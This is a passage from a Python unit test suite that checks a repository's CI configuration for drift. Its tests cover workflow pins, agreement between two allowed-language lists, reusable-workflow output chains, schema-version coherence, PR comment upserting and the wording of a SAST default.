        scoped = set(self.inv.group_paths(self.inv.workflow_surface_groups))
        for relative in (".github/workflows/commit.yml", ".github/workflows/precommit.yml"):
            self.assertIn(relative, scoped)
            self.assertIn("workflow_call:", (REPO_ROOT / relative).read_text())

    def test_action_trust_scope_covers_the_workflows_that_went_dead(self) -> None:
        """ci.yml and cd.yml are what a disallowed action silenced. If either
        drops out of the checked scope the guard would pass while the pipeline
        it exists to protect went missing again."""
        scoped = set(self.inv.group_paths(self.inv.workflow_surface_groups))
        for relative in (".github/workflows/ci.yml", ".github/workflows/cd.yml"):
            self.assertIn(relative, scoped)

    def test_declares_no_undeclared_active_document(self) -> None:
        self.assertEqual([], check_undeclared_markdown(self.inv))

    def test_declares_a_non_trivial_active_surface(self) -> None:
        self.assertGreater(len(self.inv.active_surfaces), 50)
        self.assertIn("CLAUDE.md", self.inv.active_surfaces)

    def test_historical_exclusions_stay_narrow(self) -> None:
        """Exclusions may only cover planning/history, never active material."""
        self.assertEqual(
            ["specs"], list(self.inv.historical_exclusions)
        )

    def test_every_pending_pin_repair_is_still_needed(self) -> None:
        """pin_guard.pending_repairs must not outlive the drift it excuses —
        once a change bumps a listed pin, its entry has to go in the same
        change, or this fails.
        """
        self.assertEqual([], check_pending_pin_repairs(self.inv))

    def test_ci_blocking_gate_passes_against_the_live_tree(self) -> None:
        """scripts/check-workflow-pins.py is wired into ci.yml and cd.yml's
        release commit; it must stay green even while check-repo-surface.py
        (the canonical, comprehensive checker) is red for drift another change owns.
        """
        result = subprocess.run(
            [sys.executable, str(SCRIPTS / "check-workflow-pins.py")],
            capture_output=True,
            text=True,
            check=False,
            cwd=REPO_ROOT,
        )
        self.assertEqual(0, result.returncode, result.stderr)


if __name__ == "__main__":
    unittest.main()


class IncludeLanguageSetTests(FixtureTestCase):
    """The languages `--include` accepts are enforced twice: at the module
    boundary in src/quality/include.go, and by a shell guard in the pre-commit
    reusable that refuses a bad value before Dagger is provisioned. Both are
    wanted — the guard fails in a second, the module error covers every direct
    `dagger call` — but two copies of one list is the drift this repository keeps
    getting bitten by, and it fails in two different nasty directions."""

    _MODULE = "src/quality/include.go"
    _GUARD = ".github/workflows/precommit.yml"

    def test_agreeing_sets_pass(self) -> None:
        self.assertEqual([], check_include_language_set(self.fx.load()))

    def test_module_accepting_more_is_named(self) -> None:
        """A name the module takes and the guard refuses makes the reusable
        workflow reject an input that works everywhere else."""
        self.fx.write(
            self._MODULE,
            self.fx.read(self._MODULE).replace(
                '\t"go":     "go",', '\t"go":     "go",\n\t"golang": "go",'
            ),
        )
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, "golang", self._GUARD, "refuses it")

    def test_guard_accepting_more_is_named(self) -> None:
        """A name the guard takes and the module refuses turns a valid-looking
        input into a hard error part-way through a run."""
        self.fx.write(
            self._GUARD,
            self.fx.read(self._GUARD).replace(
                "go|node|python|dotnet)", "go|golang|node|python|dotnet)"
            ),
        )
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, "golang", self._MODULE, "does not")

    def test_both_directions_at_once_are_both_reported(self) -> None:
        self.fx.write(
            self._MODULE,
            self.fx.read(self._MODULE).replace(
                '\t"go":     "go",', '\t"go":     "go",\n\t"golang": "go",'
            ),
        )
        self.fx.write(
            self._GUARD,
            self.fx.read(self._GUARD).replace(
                "go|node|python|dotnet)", "go|node|python|dotnet|rust)"
            ),
        )
        problems = check_include_language_set(self.fx.load())
        self.assertEqual(2, len(problems), problems)

    def test_a_missing_module_file_is_a_problem_not_a_pass(self) -> None:
        (self.fx.root / self._MODULE).unlink()
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, self._MODULE, "cannot read")

    def test_a_removed_alias_map_is_a_problem_not_a_pass(self) -> None:
        """Renaming the map away would silently compare an empty set against the
        guard's, which agrees with nothing and would report OK."""
        self.fx.write(self._MODULE, "package main\n\n// nothing here\n")
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, "languageAliases", "Refusing to read")

    def test_an_empty_alias_map_is_a_problem(self) -> None:
        self.fx.write(
            self._MODULE,
            "package main\n\nvar languageAliases = map[string]string{\n}\n",
        )
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, "no entries", "refuse every --include")

    def test_a_removed_guard_is_a_problem_not_a_pass(self) -> None:
        """If the guard is deliberately dropped, this check must be dropped with
        it rather than left reporting agreement with nothing."""
        self.fx.write(self._GUARD, "jobs:\n  precommit:\n    steps:\n      - run: echo hi\n")
        problems = check_include_language_set(self.fx.load())
        self.assertProblem(problems, "no `case` arm", "remove this check")

    def test_the_guards_quoting_and_case_are_normalised(self) -> None:
        """The real guard lowercases its input and quotes 'c#' because # starts a
        comment in shell. Neither is a difference in the accepted set."""
        self.fx.write(
            self._MODULE,
            self.fx.read(self._MODULE).replace(
                '\t"dotnet": "dotnet",', '\t"dotnet": "dotnet",\n\t"c#":     "dotnet",'
            ),
        )
        self.fx.write(
            self._GUARD,
            self.fx.read(self._GUARD).replace("go|node|python|dotnet)", "go|node|python|dotnet|'c#')"),
        )
        self.assertEqual([], check_include_language_set(self.fx.load()))

    def test_drift_makes_the_cli_fail(self) -> None:
        self.fx.write(
            self._GUARD,
            self.fx.read(self._GUARD).replace("go|node|python|dotnet)", "go|node|python|dotnet|rust)"),
        )
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("rust", result.stderr)


class WorkflowOutputChainTests(FixtureTestCase):
    """A reusable workflow's outputs are a three-link chain — workflow_call
    output → job output → step write into $GITHUB_OUTPUT — and GitHub validates
    none of it: a typo'd name at any link resolves to the empty string at run
    time, inside a CALLER's gate, where it reads as a verdict nobody wrote.
    Each test breaks one link and asserts the named failure."""

    _WF = ".github/workflows/commit.yml"

    def test_coherent_chain_passes(self) -> None:
        self.assertEqual([], check_workflow_output_chain(self.fx.load()))

    def test_workflow_without_workflow_call_is_out_of_scope(self) -> None:
        """A plain (non-reusable) workflow declares no outputs a caller could
        read, so there is no chain to grade."""
        self.fx.surface("reusable_workflows").append(".github/workflows/plain.yml")
        self.fx.write(
            ".github/workflows/plain.yml",
            "jobs:\n  a:\n    steps:\n      - run: echo hi\n",
        )
        self.assertEqual([], check_workflow_output_chain(self.fx.load()))

    def test_missing_job_is_named(self) -> None:
        self.fx.write(
            self._WF,
            self.fx.read(self._WF).replace(
                "value: ${{ jobs.commit.outputs.passed }}",
                "value: ${{ jobs.commitx.outputs.passed }}",
            ),
        )
        problems = check_workflow_output_chain(self.fx.load())
        self.assertProblem(problems, "no job 'commitx' exists", "empty")

    def test_undeclared_job_output_is_named(self) -> None:
        self.fx.write(
            self._WF,
            self.fx.read(self._WF).replace(
                "value: ${{ jobs.commit.outputs.passed }}",
                "value: ${{ jobs.commit.outputs.pased }}",
            ),
        )
        problems = check_workflow_output_chain(self.fx.load())
        self.assertProblem(problems, "declares no output 'pased'", "silently empty")

    def test_missing_step_id_is_named(self) -> None:
        self.fx.write(
            self._WF,
            self.fx.read(self._WF).replace(
                "passed: ${{ steps.gate.outputs.passed }}",
                "passed: ${{ steps.gaet.outputs.passed }}",
            ),
        )
        problems = check_workflow_output_chain(self.fx.load())
        self.assertProblem(problems, "no step in the job has id 'gaet'")

    def test_step_that_never_writes_the_name_is_named(self) -> None:
        """The last link: the step exists but its run body writes a different
        key, which is exactly what a typo in the echo line looks like."""
        self.fx.write(
            self._WF,
            self.fx.read(self._WF)
            .replace('echo "passed=false"', 'echo "pased=false"')
            .replace('echo "passed=true"', 'echo "pased=true"'),
        )
        problems = check_workflow_output_chain(self.fx.load())
        self.assertProblem(problems, "never writes 'passed='", "GITHUB_OUTPUT")

    def test_uses_step_outputs_are_not_graded(self) -> None:
        """An action's outputs are its own contract — the checker cannot see
        into a uses: step, so referencing one must not be a failure."""
        self.fx.write(
            self._WF,
            self.fx.read(self._WF)
            .replace(
                "      - uses: actions/checkout@v4\n",
                "      - id: co\n        uses: actions/checkout@v4\n",
            )
            .replace(
                "      passed: ${{ steps.gate.outputs.passed }}\n",
                "      passed: ${{ steps.gate.outputs.passed }}\n"
                "      ref: ${{ steps.co.outputs.ref }}\n",
            ),
        )
        self.assertEqual([], check_workflow_output_chain(self.fx.load()))

    def test_output_with_no_value_is_named(self) -> None:
        self.fx.write(
            self._WF,
            self.fx.read(self._WF).replace(
                "    outputs:\n      evidence-artifact:",
                "    outputs:\n"
                "      dead:\n"
                "        description: Declared, never given a value.\n"
                "      evidence-artifact:",
            ),
        )
        problems = check_workflow_output_chain(self.fx.load())
        self.assertProblem(problems, "'dead' has no value", "empty string on every run")

    def test_broken_chain_makes_the_cli_fail(self) -> None:
        self.fx.write(
            self._WF,
            self.fx.read(self._WF).replace(
                "value: ${{ jobs.commit.outputs.passed }}",
                "value: ${{ jobs.commit.outputs.pased }}",
            ),
        )
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("pased", result.stderr)


class SchemaVersionCoherenceTests(FixtureTestCase):
    """The evidence schemaVersion is written in six kinds of file.

    It sat at 1.0.0 while the envelope gained four fields, and this is why:
    moving it meant a coordinated edit across a canonical constant, ten module
    copies, a const in schema.json, the outputSchema of every contract, and an
    allowlist in the contract validator — with nothing comparing the results.
    Each test below is one of those places left behind.
    """

    _CANON = "src/internal/evidence/schema.go"

    def test_a_workflow_asserting_a_stale_literal_is_caught(self) -> None:
        """The literal the schema modules, contracts and validator cannot see.

        .github/workflows/ci.yml really did assert schemaVersion == '1.0.0' on
        the composite evidence. No check above reads workflow files, so the bump
        would have gone red in CI after a push rather than here.
        """
        self.fx.write(
            ".github/workflows/smoke.yml",
            "on: push\njobs:\n  a:\n    steps:\n      - run: |\n"
            "          assert d.get('schemaVersion') == '1.0.0', 'wrong'\n",
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(
            problems, ".github/workflows/smoke.yml", "compares schemaVersion", "'1.0.0'"
        )

    def test_a_smoke_script_asserting_a_stale_literal_is_caught(self) -> None:
        self.fx.write(
            "scripts/smoke/shapes.sh",
            "#!/usr/bin/env bash\npython3 -c 'd.get(\"schemaVersion\")==\"1.0.0\"'\n",
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "scripts/smoke/shapes.sh", "compares schemaVersion")

    def test_a_shell_variable_pinned_to_a_literal_is_caught(self) -> None:
        """The assignment form, not just the comparison form.

        A smoke that sets expected_schemaVersion="1.0.0" and compares against
        the variable later has the same stale fact, one indirection away.
        """
        self.fx.write(
            "scripts/smoke/shapes.sh",
            '#!/usr/bin/env bash\nexpected_schemaVersion="1.0.0"\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "scripts/smoke/shapes.sh", "compares schemaVersion")

    def test_a_workflow_naming_the_current_version_is_accepted(self) -> None:
        """A literal that is CURRENT is redundant, not wrong.

        This check is about staleness. Banning the pattern outright would also
        ban a test that deliberately asserts an old version is rejected, and the
        repository has no such test to protect today — so the looser rule is the
        one that will not have to be argued with later.
        """
        self.fx.write(
            ".github/workflows/smoke.yml",
            "on: push\njobs:\n  a:\n    steps:\n      - run: |\n"
            "          assert d.get('schemaVersion') == '1.1.0', 'wrong'\n",
        )
        self.assertEqual(check_schema_version_coherence(self.fx.load()), [])

    def test_a_mock_envelope_carrying_an_old_version_is_not_flagged(self) -> None:
        """Envelope JSON written as INPUT is not a claim about the version.

        ci.yml feeds hand-written envelopes to the notify and pages renderers on
        purpose, and nothing in cicd reads schemaVersion back — those fixtures
        are the evidence of that. Flagging them would make the check noise, and
        a noisy check gets its finding suppressed rather than read.
        """
        self.fx.write(
            ".github/workflows/smoke.yml",
            "on: push\njobs:\n  a:\n    steps:\n      - run: |\n"
            "          echo '{\"schemaVersion\":\"1.0.0\",\"passed\":true}' > /tmp/e.json\n",
        )
        self.assertEqual(check_schema_version_coherence(self.fx.load()), [])

    def test_a_workflow_added_later_is_scanned_without_being_listed(self) -> None:
        """The file set is globbed, not enumerated.

        A hand-maintained list of files to scan is the same defect class as a
        hand-maintained list of version copies: the next workflow joins the
        repository outside it.
        """
        self.fx.write(
            ".github/workflows/brand-new.yaml",
            "on: push\njobs:\n  a:\n    steps:\n      - run: |\n"
            "          assert d['schemaVersion'] != '1.0.0'\n",
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, ".github/workflows/brand-new.yaml")

    def test_a_module_copy_left_on_the_old_version_is_caught(self) -> None:
        self.fx.write("src/quality/schema.go", 'package main\n\nconst SchemaVersion = "1.0.0"\n')
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "src/quality/schema.go", "'1.0.0'", "canonical is '1.1.0'")

    def test_an_unsynced_copy_is_checked_like_any_other(self) -> None:
        """make sync-schema skips src/risk, so its copy is the one a bump misses.

        The fixture's module is a stand-in; what matters is that this check reads
        schema_modules rather than schema_synced_modules, so a hand-maintained
        copy is not exempt from the comparison.
        """
        self.fx.inventory["schema_modules"] = ["src/quality"]
        self.fx.inventory["schema_synced_modules"] = []
        self.fx.write("src/quality/schema.go", 'package main\n\nconst SchemaVersion = "0.9.0"\n')
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "src/quality/schema.go", "'0.9.0'")

    def test_schema_json_left_on_the_old_const_is_caught(self) -> None:
        self.fx.write(
            "src/internal/evidence/schema.json",
            self.fx.read("src/internal/evidence/schema.json").replace('"1.1.0"', '"1.0.0"'),
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "schema.json", "no schemaVersion const equal to '1.1.0'")

    def test_a_contract_naming_a_minor_version_is_caught(self) -> None:
        self.fx.write(
            "src/quality/contract.json",
            '{"step": "src/quality", "outputSchema": "evidence-1.1.0"}\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(
            problems, "src/quality/contract.json", "evidence-1.1.0", "major family"
        )

    def test_a_contract_naming_the_wrong_major_is_caught(self) -> None:
        self.fx.write(
            "src/quality/contract.json",
            '{"step": "src/quality", "outputSchema": "evidence-2"}\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "evidence-2", "expected 'evidence-1'")

    def test_the_list_form_of_the_family_is_accepted(self) -> None:
        self.fx.write(
            "src/quality/contract.json",
            '{"step": "src/quality", "outputSchema": "evidence-1[]"}\n',
        )
        self.assertEqual([], check_schema_version_coherence(self.fx.load()))

    def test_a_validator_still_accepting_a_retired_value_is_caught(self) -> None:
        self.fx.append(
            "src/cross-cutting/contract/verify.go",
            '\nvar legacy = map[string]bool{\n\t"evidence-1.0.0": true,\n}\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "still accepts outputSchema 'evidence-1.0.0'")

    def test_a_validator_that_rejects_the_current_family_is_caught(self) -> None:
        self.fx.write(
            "src/cross-cutting/contract/verify.go",
            'package main\n\nvar validOutputSchemas = map[string]bool{\n'
            '\t"evidence-1": true,\n\t"none":       true,\n}\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "does not accept outputSchema 'evidence-1[]'")

    def test_an_absent_allowlist_is_a_problem_not_a_pass(self) -> None:
        """The map moved from main.go to verify.go; a checker that read the old
        path as nothing-to-check would have passed every family from then on."""
        (self.fx.root / "src/cross-cutting/contract/verify.go").unlink()
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "src/cross-cutting/contract/verify.go is missing")

    def test_a_major_bump_moves_the_family_every_contract_must_declare(self) -> None:
        """The family is derived, not written twice.

        A major bump is the one case where every contract and the allowlist must
        change, and this is what makes that a red check rather than a memo.
        """
        self.fx.write(self._CANON, 'package evidence\n\nconst SchemaVersion = "2.0.0"\n')
        problems = check_schema_version_coherence(self.fx.load())
        joined = "\n".join(problems)
        self.assertIn("expected 'evidence-2'", joined)
        self.assertIn("still accepts outputSchema 'evidence-1'", joined)
        self.assertIn("does not accept outputSchema 'evidence-2'", joined)

    def test_an_absent_canonical_file_is_a_problem_not_a_pass(self) -> None:
        """The canonical constant is in no active_surfaces group, so nothing else
        would notice it going missing. A check that returned no problems here
        would be an absent check reading as a passing one."""
        (self.fx.root / self._CANON).unlink()
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, self._CANON, "unreadable")

    def test_a_canonical_version_that_is_not_semver_is_a_problem(self) -> None:
        self.fx.write(self._CANON, 'package evidence\n\nconst SchemaVersion = "1.1"\n')
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "not major.minor.patch")

    def test_two_canonical_constants_are_a_problem(self) -> None:
        """Whichever one the regex happened to read first would become the
        canonical answer, silently."""
        self.fx.write(
            self._CANON,
            'package evidence\n\nconst SchemaVersion = "1.1.0"\n\nconst evidenceSchemaVersion = "1.1.0"\n',
        )
        problems = check_schema_version_coherence(self.fx.load())
        self.assertProblem(problems, "declares 2 schema-version constant(s)")

    def test_the_cli_fails_on_an_incoherent_version(self) -> None:
        self.fx.write("src/quality/schema.go", 'package main\n\nconst SchemaVersion = "1.0.0"\n')
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)
        self.assertIn("schemaVersion agrees everywhere", result.stderr)


class PRCommentUpsertTests(FixtureTestCase):
    """scenario: pr-verdict-comment-appends-instead-of-updating.

    The defect the check exists for shipped on one of this repository's pull requests: three
    comments, one per push, every one of them carrying the identical marker
    notify had rendered for exactly this purpose. Nothing was red — the thread
    simply filled with stale verdicts and nothing said which one was live.
    """

    # The shape that shipped: a single inline command. A check reading only
    # block scalars would not see it, so the revert it exists to refuse would
    # pass — which is why _run_scripts reads both forms.
    APPEND_ONLY = "jobs:\n  d:\n    steps:\n      - name: Post PR comment\n        run: gh pr comment \"$PR\" --body-file ./audit-evidence/comment.md\n"

    def test_baseline_fixture_upserts(self) -> None:
        self.assertEqual([], check_pr_comment_upsert(self.fx.load()))

    def test_append_only_poster_is_named(self) -> None:
        self.fx.write(".github/workflows/dogfood.yml", self.APPEND_ONLY)
        problems = check_pr_comment_upsert(self.fx.load())
        # Both rules fire, and that is right: the step neither upserts nor
        # matches the copy that does. Asserting on only one would let the
        # other silently stop reporting.
        self.assertEqual(2, len(problems), problems)
        self.assertIn("never PATCHes", problems[0])
        self.assertIn("every push", problems[0])
        self.assertIn(".github/workflows/dogfood.yml", problems[0])
        self.assertIn("differently from", problems[1])

    def test_append_only_poster_makes_the_cli_fail(self) -> None:
        self.fx.write(".github/workflows/dogfood.yml", self.APPEND_ONLY)
        result = self.fx.run_cli()
        self.assertEqual(1, result.returncode, result.stdout)

    def test_drifted_copy_is_named(self) -> None:
        """Both copies upsert, but not the same way. A reusable workflow runs
        against the caller's checkout, so the body cannot be sourced from
        scripts/ci/ — the only thing holding the copies together is this check."""
        drifted = PR_COMMENT_STEP.replace("first(.[].id)", "last(.[].id)")
        self.fx.write(".github/workflows/dogfood.yml", "jobs:\n  d:\n    steps:" + drifted)
        problems = check_pr_comment_upsert(self.fx.load())
        self.assertProblem(problems, "differently from", "byte-identical")

    def test_no_poster_at_all_is_refused(self) -> None:
        """A sweep with an empty subject is not a repository that passed — the
        vacuous-truth failure this repository has shipped elsewhere twice."""
        for rel in (".github/workflows/commit.yml", ".github/workflows/dogfood.yml"):
            self.fx.write(rel, self.fx.read(rel).replace(PR_COMMENT_STEP, "\n"))
        problems = check_pr_comment_upsert(self.fx.load())
        self.assertProblem(problems, "no workflow step posts a PR comment", "defends nothing")


class SastDefaultWordingTests(FixtureTestCase):
    """The documented default must be one the module accepts (0.3 of the
    open-source prep). The fixture's surfaces carry no SAST wording, so each
    test appends exactly one claim and asserts whether it is refused."""

    SURFACE = "templates/github-actions/commit.yml"

    def test_baseline_fixture_is_clean(self) -> None:
        self.assertEqual([], check_sast_default_wording(self.fx.load()))

    def test_the_parenthesised_workflow_form_is_named(self) -> None:
        self.fx.append(self.SURFACE, '      # sast-rulesets: empty keeps the composite default ("auto").\n')
        problems = check_sast_default_wording(self.fx.load())
        self.assertProblem(problems, f"{self.SURFACE}:", '"auto"', "p/security-audit")

    def test_the_prose_form_is_named(self) -> None:
        self.fx.append(self.SURFACE, "      # Semgrep rulesets: Default is `auto` (broad).\n")
        self.assertProblem(check_sast_default_wording(self.fx.load()), '"auto"')

    def test_the_reverse_form_is_named(self) -> None:
        self.fx.append(self.SURFACE, "      # For SAST, \"auto\" is the default.\n")
        self.assertProblem(check_sast_default_wording(self.fx.load()), '"auto"')

    def test_a_claim_split_across_two_lines_is_named(self) -> None:
        """The shape precommit.yml carried: the subject on one line, the claim on
        the next. A line-local check read it as not being about SAST at all."""
        self.fx.append(
            self.SURFACE,
            "          # passing --sast-rulesets \"\" would override the\n"
            "          # composite default (\"auto\") with an empty config\n",
        )
        self.assertProblem(check_sast_default_wording(self.fx.load()), '"auto"')

    def test_the_correct_sentence_is_accepted(self) -> None:
        """`default` followed by the real value, with `auto` named as refused,
        is the wording every surface now carries. It must not match, or the
        fix would be refused by its own guard."""
        self.fx.append(
            self.SURFACE,
            '      # Empty keeps the composite default (p/security-audit); "auto" is refused by the security module.\n'
            '      # sastRulesets string, // default "p/security-audit" ("auto" is refused)\n',
        )
        self.assertEqual([], check_sast_default_wording(self.fx.load()))

    def test_auto_detection_of_languages_is_not_a_sast_default(self) -> None:
        """`--include` prose says "auto-detects" and "auto-detection" without
        quotes; the word alone is not the claim."""
        self.fx.append(
            self.SURFACE,
            "      # include: empty keeps auto-detection by marker file (default).\n"
            "      # platform: default \"auto\" picks the runner's architecture.\n",
        )
        self.assertEqual([], check_sast_default_wording(self.fx.load()))

    def test_a_historical_document_may_keep_the_claim(self) -> None:
        self.fx.write("docs/history/note.md", 'The Semgrep default ("auto") was wrong.\n')
        self.assertEqual([], check_sast_default_wording(self.fx.load()))
